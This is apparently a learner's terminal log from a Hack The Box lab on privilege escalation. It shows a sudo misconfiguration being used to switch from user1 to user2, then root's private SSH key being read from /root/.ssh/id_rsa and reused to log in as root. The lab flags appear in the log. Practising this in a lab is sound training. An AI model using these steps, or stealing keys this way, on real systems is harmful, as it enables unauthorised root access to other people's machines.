{ SSH into the server 83.136.254.11 and using '-p 51017 to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.}



┌──(elpadre㉿kali)-[~]
└─$ ssh user1@83.136.254.11 -p 51017
The authenticity of host '[83.136.254.11]:51017 ([83.136.254.11]:51017)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[83.136.254.11]:51017' (ED25519) to the list of known hosts.
(user1@83.136.254.11) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user1@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~$ sudo -l
Matching Defaults entries for user1 on ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~$ sudo -u user2
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
user1@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~$ sudo -u user2 /home/
[sudo] password for user1: 
sudo: /home/: command not found
user1@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~$ sudo -u user2 ^C
user1@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~$ sudo -u user2 /bin/bash
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/home/user1$ /home/user2
bash: /home/user2: Is a directory
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/home/user1$ cat /home/user2/flag.txt'

user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/home/user1$ cat /home/user2/flag.txt 

HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/home/user1$ cd root
bash: cd: root: No such file or directory
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/home/user1$ cd /root
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/root$ ls
flag.txt
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/root$ cat flag.txt
cat: flag.txt: Permission denied
user2@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:/root$ 





{Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.}

┌──(elpadre㉿kali)-[~]
└─$ vim id_rsa

(Navigate to the ‘/root’ directory: cd /root
Move to the ‘.ssh’ directory: cd .ssh
Display the contents of the ‘id_rsa’ file, which contains the private SSH key for root access: cat id_rsa
Copy the entire contents of the ‘id_rsa’ file.
Open a new terminal on your local machine.
Create a new file named ‘id_rsa’: vim id_rsa. Paste the copied contents into it.
Change the permissions of the ‘id_rsa’ file to ensure proper security: chmod 600 id_rsa)


┌──(elpadre㉿kali)-[~]
└─$ chmod 600 id_rsa
                                                                                                                                                                                                                                              
┌──(elpadre㉿kali)-[~]
└─$ ssh -p 51017 root@83.136.254.11 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~# ls
flag.txt
root@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~# cat flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
root@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~# ^C
root@ng-889175-gettingstartedprivesc-zm9pk-677d466645-c27x8:~# 

